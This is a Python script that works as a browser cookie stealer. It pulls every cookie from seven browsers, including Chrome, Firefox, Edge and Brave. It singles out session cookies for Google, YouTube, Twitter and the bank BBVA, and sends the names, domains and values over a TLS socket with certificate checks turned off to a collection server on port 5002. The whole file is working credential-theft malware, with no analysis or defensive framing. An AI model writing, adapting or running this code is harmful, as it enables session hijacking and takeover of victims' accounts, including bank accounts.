import pprint
import socket
import ssl
import tempfile
import threading
import time
import browser_cookie3
import certs
from colorama import Fore
import colorama
colorama.init()

def know_gme():
    return "127.0.0.1"


def getAllCookiesFromBrowser(browser):
    # Variables necesarias
    Cookies={}
    id = 0

    # Buscador
    chromeCookies = list(browser)

    # Bucle principal
    for cookie in chromeCookies:
        Cookies[id] = cookie
        id += 1

    # Devolvemos las cookies (todas)
    return Cookies, id


def processCookiesData(cookie_list, max_id, browser):
    sites = ["youtube.com", "google.com", "google.es", "www.bbva.com", "twitter.com"]

    godCookiesList = {browser: {}}

    allCleanCookieList  = {browser: {}}

    for i in range(max_id):
        cookieName = cookie_list[i].name
        cookieDomain = cookie_list[i].domain
        cookieValue = cookie_list[i].value

        for impSite in sites:
            if impSite in cookieDomain:
                godCookiesList[browser][i] = {"name": cookieName,
                                         "domain": cookieDomain,
                                         "value": cookieValue}

            else:
                allCleanCookieList[browser][i] = {"name": cookieName,
                                         "domain": cookieDomain,
                                         "value": cookieValue}

    #pprint.pprint(godCookiesList)
    return godCookiesList, allCleanCookieList



def startExtraction():

    browsers = ["Edge", "Chrome", "Brave", "Firefox", "Opera", "OperaGX", "LibreWolf"]
    allCookiesFromBrowsers = []
    allValiousCookiesFromBrowsers = []

    for browser in browsers:
        try:
            if browser == "Edge":
                cookie_list, max_id = getAllCookiesFromBrowser(browser_cookie3.edge())
                valiousCookiesEdge, allCookiesEdge = processCookiesData(cookie_list, max_id, browser)
                allCookiesFromBrowsers.append(allCookiesEdge)
                allValiousCookiesFromBrowsers.append(valiousCookiesEdge)

            elif browser == "Chrome":
                cookie_list, max_id = getAllCookiesFromBrowser(browser_cookie3.chrome())
                valiousCookiesChrome, allCookiesChrome = processCookiesData(cookie_list, max_id, browser)
                allCookiesFromBrowsers.append(allCookiesChrome)
                allValiousCookiesFromBrowsers.append(valiousCookiesChrome)

            elif browser == "Brave":
                cookie_list, max_id = getAllCookiesFromBrowser(browser_cookie3.brave())
                valiousCookiesBrave, allCookiesBrave = processCookiesData(cookie_list, max_id, browser)
                allCookiesFromBrowsers.append(allCookiesBrave)
                allValiousCookiesFromBrowsers.append(valiousCookiesBrave)

            elif browser == "Firefox":
                cookie_list, max_id = getAllCookiesFromBrowser(browser_cookie3.Firefox())
                valiousCookiesFirefox, allCookiesFirefox = processCookiesData(cookie_list, max_id, browser)
                allCookiesFromBrowsers.append(allCookiesFirefox)
                allValiousCookiesFromBrowsers.append(valiousCookiesFirefox)

            elif browser == "Opera":
                cookie_list, max_id = getAllCookiesFromBrowser(browser_cookie3.Opera())
                valiousCookiesOpera, allCookiesOpera = processCookiesData(cookie_list, max_id, browser)
                allCookiesFromBrowsers.append(allCookiesOpera)
                allValiousCookiesFromBrowsers.append(valiousCookiesOpera)

            elif browser == "OperaGX":
                cookie_list, max_id = getAllCookiesFromBrowser(browser_cookie3.OperaGX())
                valiousCookiesOperaGX, allCookiesOperaGX = processCookiesData(cookie_list, max_id, browser)
                allCookiesFromBrowsers.append(allCookiesOperaGX)
                allValiousCookiesFromBrowsers.append(valiousCookiesOperaGX)

            elif browser == "LibreWolf":
                cookie_list, max_id = (getAllCookiesFromBrowser(browser_cookie3.LibreWolf()))
                valiousCookiesLibreWolf, allCookiesLibreWolf = processCookiesData(cookie_list, max_id, browser)
                allCookiesFromBrowsers.append(allCookiesLibreWolf)
                allValiousCookiesFromBrowsers.append(valiousCookiesLibreWolf)

        except browser_cookie3.BrowserCookieError:
            continue
        except PermissionError as e:
            continue


    return allCookiesFromBrowsers, allValiousCookiesFromBrowsers
    #valiousCookies, allCookies = processCookiesData(cookie_list, max_id)


def sendJson(secc, allCookiesFromBrowsers, allValiousCookiesFromBrowsers):
    secc.send("\n\t[ JSON DATA COOKIES ]".encode())
    secc.send("\nCOOKIE:\t {}".format(allCookiesFromBrowsers[0]).encode())
    #secc.send("\nCOOKIEIMP:\t {}".format(allValiousCookiesFromBrowsers[0]).encode())


def printProcessData(cookieName, cookieDomain, cookieValue, id):
    # Print cookies data
    print(Fore.LIGHTGREEN_EX + "══════════════════════════════════════════════════════════►\n" + Fore.RESET)
    print(Fore.LIGHTYELLOW_EX + f"\t {id}. " + Fore.CYAN + "Name:\t" + Fore.RESET + f"{cookieName}: \n" )
    print(Fore.RED + "\t\t\t| " + Fore.LIGHTYELLOW_EX + "[" + Fore.RED + "♦" + Fore.LIGHTYELLOW_EX + "]" + Fore.CYAN + " Domain: "
          + Fore.LIGHTYELLOW_EX + f"\t {cookieDomain} ")
    print(Fore.RED + "			|" + "-" * 29 + "|")
    print(Fore.RED + "\t\t\t| " + Fore.LIGHTYELLOW_EX + "[" + Fore.RED + "♦" + Fore.LIGHTYELLOW_EX + "]" + Fore.CYAN + " Value: "
          + Fore.LIGHTYELLOW_EX + f"\t {cookieValue} \n\n" + Fore.RESET)



def sendProcessData(cookieName, cookieDomain, cookieValue, id, browser, secc):
    secc.send(f"[!>] Browser Cookies: {browser}\n".encode())
    secc.send("----------------------------------------------------\n".encode())
    secc.send(f"\t {id}. Name:\t{cookieName}: \n".encode())
    secc.send(f"\t\t| [*] Domain: \t {cookieDomain} \n".encode())
    secc.send("	        |-----------------------------|\n".encode())
    secc.send(f"\t\t| [*] Value: \t {cookieValue} \n\n".encode())



def processAndSend(data, dataValious, secc):

    # Replace Header
    for browser in data:
        # print(Fore.LIGHTYELLOW_EX + "[!>] " + Fore.RESET + "Browser Cookies: " + Fore.LIGHTYELLOW_EX + "{}".format(browser))
        for id in data[browser]:
            cookieName = data[browser][id]['name']
            cookieDomain = data[browser][id]['domain']
            cookieValue = data[browser][id]['value']

            # Escribimos los datos
            sendProcessData(cookieName, cookieDomain, cookieValue, id, browser, secc)
            time.sleep(0.00001)
            #printProcessData(cookieName, cookieDomain, cookieValue, id)


def start(secc):
    # Enviar a la conn de find_interest
    allCookiesFromBrowsers, allValiousCookiesFromBrowsers = startExtraction()
    processAndSend(allCookiesFromBrowsers[0], allValiousCookiesFromBrowsers[0], secc)
    secc.close()
    #sendJson(secc, allCookiesFromBrowsers, allValiousCookiesFromBrowsers)


def main(secc):
    try:
        ses = threading.Thread(target=start(secc))
        ses.start()
        #ses.join()
    except Exception:
        pass


if __name__ == "__main__":
    cock = tempfile.NamedTemporaryFile(delete=False)
    cock.write(certs.get_crte().encode())
    cock.close()

    csd = tempfile.NamedTemporaryFile(delete=False)
    csd.write(certs.get_locker().encode())
    csd.close()

    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    context.verify_mode = ssl.CERT_NONE
    context.check_hostname = False
    context.load_cert_chain(certfile=cock.name, keyfile=csd.name)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((know_gme(), 5002))
    secc = context.wrap_socket(sock, server_hostname=know_gme())

    main(secc)

    """allCookiesFromBrowsers, allValiousCookiesFromBrowsers = startExtraction()
    pprint.pprint(allCookiesFromBrowsers)
    print("\n\n")
    pprint.pprint(allValiousCookiesFromBrowsers)"""